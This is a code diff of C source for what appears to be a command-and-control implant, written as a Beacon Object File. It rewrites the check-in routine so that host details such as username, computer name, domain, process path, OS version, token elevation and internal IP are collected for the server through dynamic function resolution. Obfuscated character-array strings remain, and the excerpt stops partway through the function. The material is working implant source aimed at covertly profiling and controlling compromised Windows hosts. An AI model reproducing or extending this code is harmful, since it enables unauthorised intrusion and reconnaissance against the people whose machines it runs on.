@@ -27,6 +27,21 @@ WINBASEAPI BOOL WINAPI KERNEL32$VirtualFree(LPVOID lpAddress, SIZE_T dwSize, DWO
 WINBASEAPI HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR lpLibFileName);
 WINBASEAPI FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE hModule, LPCSTR lpProcName);
 WINBASEAPI DWORD WINAPI KERNEL32$GetTickCount(void);
+WINBASEAPI VOID  WINAPI KERNEL32$Sleep(DWORD dwMilliseconds);
+WINBASEAPI BOOL  WINAPI KERNEL32$GetComputerNameA(LPSTR, LPDWORD);
+WINBASEAPI DWORD WINAPI KERNEL32$GetModuleFileNameA(HMODULE, LPSTR, DWORD);
+WINBASEAPI UINT  WINAPI KERNEL32$GetACP(void);
+WINBASEAPI UINT  WINAPI KERNEL32$GetOEMCP(void);
+WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentProcessId(void);
+WINBASEAPI DWORD WINAPI KERNEL32$GetCurrentThreadId(void);
+WINBASEAPI DWORD WINAPI KERNEL32$GetEnvironmentVariableA(LPCSTR, LPSTR, DWORD);
+WINBASEAPI BOOL  WINAPI KERNEL32$CloseHandle(HANDLE);
+
+WINBASEAPI BOOL  WINAPI ADVAPI32$GetUserNameA(LPSTR, LPDWORD);
+WINBASEAPI BOOL  WINAPI ADVAPI32$OpenProcessToken(HANDLE, DWORD, PHANDLE);
+WINBASEAPI BOOL  WINAPI ADVAPI32$GetTokenInformation(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
+
+WINBASEAPI NTSTATUS NTAPI NTDLL$RtlGetVersion(PRTL_OSVERSIONINFOW);
 
 DECLSPEC_IMPORT void * __cdecl MSVCRT$malloc(size_t);
 DECLSPEC_IMPORT void   __cdecl MSVCRT$free(void *);
@@ -134,92 +149,46 @@ static int transact(MvState *state, unsigned char *payload, int payload_len,
  * On success, the server responds with an 8-byte agent ID (zero-padded to 36B).
  */
 static int do_checkin(MvState *state) {
-    char s_advapi32[] = {'A','D','V','A','P','I','3','2',0};
-    char s_kernel32[] = {'K','E','R','N','E','L','3','2',0};
-    char s_ntdll[]    = {'n','t','d','l','l',0};
-    HMODULE hAdvapi32 = KERNEL32$LoadLibraryA(s_advapi32);
-    HMODULE hKernel32 = KERNEL32$LoadLibraryA(s_kernel32);
-    HMODULE hNtdll    = KERNEL32$LoadLibraryA(s_ntdll);
-
-    typedef BOOL  (WINAPI *fn_GetUserNameA)(LPSTR, LPDWORD);
-    typedef BOOL  (WINAPI *fn_GetComputerNameA)(LPSTR, LPDWORD);
-    typedef DWORD (WINAPI *fn_GetModuleFileNameA)(HMODULE, LPSTR, DWORD);
-    typedef UINT  (WINAPI *fn_GetACP)(void);
-    typedef UINT  (WINAPI *fn_GetOEMCP)(void);
-    typedef DWORD (WINAPI *fn_GetCurrentProcessId)(void);
-    typedef DWORD (WINAPI *fn_GetCurrentThreadId)(void);
-    typedef DWORD (WINAPI *fn_GetEnvironmentVariableA)(LPCSTR, LPSTR, DWORD);
-    typedef BOOL  (WINAPI *fn_OpenProcessToken)(HANDLE, DWORD, PHANDLE);
-    typedef BOOL  (WINAPI *fn_GetTokenInformation)(HANDLE, TOKEN_INFORMATION_CLASS, LPVOID, DWORD, PDWORD);
-    typedef BOOL  (WINAPI *fn_CloseHandle)(HANDLE);
-    typedef NTSTATUS (NTAPI *fn_RtlGetVersion)(PRTL_OSVERSIONINFOW);
-
-    char s_GetUserNameA[]       = {'G','e','t','U','s','e','r','N','a','m','e','A',0};
-    char s_GetComputerNameA[]   = {'G','e','t','C','o','m','p','u','t','e','r','N','a','m','e','A',0};
-    char s_GetModuleFileNameA[] = {'G','e','t','M','o','d','u','l','e','F','i','l','e','N','a','m','e','A',0};
-    char s_GetACP[]             = {'G','e','t','A','C','P',0};
-    char s_GetOEMCP[]           = {'G','e','t','O','E','M','C','P',0};
-    char s_GetCurrentProcessId[]= {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','I','d',0};
-    char s_GetCurrentThreadId[] = {'G','e','t','C','u','r','r','e','n','t','T','h','r','e','a','d','I','d',0};
-    char s_GetEnvironmentVariableA[] = {'G','e','t','E','n','v','i','r','o','n','m','e','n','t','V','a','r','i','a','b','l','e','A',0};
-    char s_OpenProcessToken[]   = {'O','p','e','n','P','r','o','c','e','s','s','T','o','k','e','n',0};
-    char s_GetTokenInformation[]= {'G','e','t','T','o','k','e','n','I','n','f','o','r','m','a','t','i','o','n',0};
-    char s_CloseHandle[]        = {'C','l','o','s','e','H','a','n','d','l','e',0};
-    char s_RtlGetVersion[]      = {'R','t','l','G','e','t','V','e','r','s','i','o','n',0};
-
-    fn_GetUserNameA           pGetUserNameA    = (fn_GetUserNameA)KERNEL32$GetProcAddress(hAdvapi32, s_GetUserNameA);
-    fn_GetComputerNameA       pGetComputerNameA= (fn_GetComputerNameA)KERNEL32$GetProcAddress(hKernel32, s_GetComputerNameA);
-    fn_GetModuleFileNameA     pGetModFileName  = (fn_GetModuleFileNameA)KERNEL32$GetProcAddress(hKernel32, s_GetModuleFileNameA);
-    fn_GetACP                 pGetACP          = (fn_GetACP)KERNEL32$GetProcAddress(hKernel32, s_GetACP);
-    fn_GetOEMCP               pGetOEMCP        = (fn_GetOEMCP)KERNEL32$GetProcAddress(hKernel32, s_GetOEMCP);
-    fn_GetCurrentProcessId    pGetPid          = (fn_GetCurrentProcessId)KERNEL32$GetProcAddress(hKernel32, s_GetCurrentProcessId);
-    fn_GetCurrentThreadId     pGetTid          = (fn_GetCurrentThreadId)KERNEL32$GetProcAddress(hKernel32, s_GetCurrentThreadId);
-    fn_GetEnvironmentVariableA pGetEnv         = (fn_GetEnvironmentVariableA)KERNEL32$GetProcAddress(hKernel32, s_GetEnvironmentVariableA);
-    fn_OpenProcessToken       pOpenTok         = (fn_OpenProcessToken)KERNEL32$GetProcAddress(hAdvapi32, s_OpenProcessToken);
-    fn_GetTokenInformation    pGetTokInfo      = (fn_GetTokenInformation)KERNEL32$GetProcAddress(hAdvapi32, s_GetTokenInformation);
-    fn_CloseHandle            pCloseHandle     = (fn_CloseHandle)KERNEL32$GetProcAddress(hKernel32, s_CloseHandle);
-    fn_RtlGetVersion          pRtlGetVersion   = (fn_RtlGetVersion)KERNEL32$GetProcAddress(hNtdll, s_RtlGetVersion);
-
-    /* Gather host information */
+    /* Gather host information — all calls via DFR */
     char username[256]; MSVCRT$memset(username, 0, sizeof(username));
     DWORD uname_len = sizeof(username);
-    if (pGetUserNameA) pGetUserNameA(username, &uname_len);
+    ADVAPI32$GetUserNameA(username, &uname_len);
 
     char computer[256]; MSVCRT$memset(computer, 0, sizeof(computer));
     DWORD comp_len = sizeof(computer);
-    if (pGetComputerNameA) pGetComputerNameA(computer, &comp_len);
+    KERNEL32$GetComputerNameA(computer, &comp_len);
 
     char domain[256]; MSVCRT$memset(domain, 0, sizeof(domain));
     char s_userdomain[] = {'U','S','E','R','D','O','M','A','I','N',0};
-    if (pGetEnv) pGetEnv(s_userdomain, domain, sizeof(domain));
+    KERNEL32$GetEnvironmentVariableA(s_userdomain, domain, sizeof(domain));
 
-    DWORD pid = pGetPid ? pGetPid() : 0;
-    DWORD tid = pGetTid ? pGetTid() : 0;
+    DWORD pid = KERNEL32$GetCurrentProcessId();
+    DWORD tid = KERNEL32$GetCurrentThreadId();
 
     char imgpath[260]; MSVCRT$memset(imgpath, 0, sizeof(imgpath));
-    if (pGetModFileName) pGetModFileName(NULL, imgpath, 260);
+    KERNEL32$GetModuleFileNameA(NULL, imgpath, 260);
 
-    DWORD acp   = pGetACP   ? pGetACP()   : 0;
-    DWORD oemcp = pGetOEMCP ? pGetOEMCP() : 0;
+    DWORD acp   = KERNEL32$GetACP();
+    DWORD oemcp = KERNEL32$GetOEMCP();
 
     RTL_OSVERSIONINFOW osvi; MSVCRT$memset(&osvi, 0, sizeof(osvi));
     osvi.dwOSVersionInfoSize = sizeof(osvi);
-    if (pRtlGetVersion) pRtlGetVersion(&osvi);
+    NTDLL$RtlGetVersion(&osvi);
 
     /* Check if running elevated */
     int elevated = 0;
-    if (pOpenTok && pGetTokInfo) {
+    {
         HANDLE hToken = NULL;
-        if (pOpenTok((HANDLE)(LONG_PTR)-1, TOKEN_QUERY, &hToken)) {
+        if (ADVAPI32$OpenProcessToken((HANDLE)(LONG_PTR)-1, TOKEN_QUERY, &hToken)) {
             TOKEN_ELEVATION te; MSVCRT$memset(&te, 0, sizeof(te));
             DWORD te_len = 0;
-            if (pGetTokInfo(hToken, TokenElevation, &te, sizeof(te), &te_len))
+            if (ADVAPI32$GetTokenInformation(hToken, TokenElevation, &te, sizeof(te), &te_len))
                 elevated = te.TokenIsElevated;
-            if (pCloseHandle) pCloseHandle(hToken);
+            KERNEL32$CloseHandle(hToken);
         }
     }
 
-    /* Resolve internal IP via GetBestRoute2 (route to 8.8.8.8) */
+    /* Resolve internal IP via GetBestRoute2 (route to 8.8.8.8) — manual resolve since iphlpapi isn't a standard DFR module */
     ULONG internal_ip = 0;
     {
         char s_iphlpapi[] = {'i','p','h','l','p','a','p','i',0};
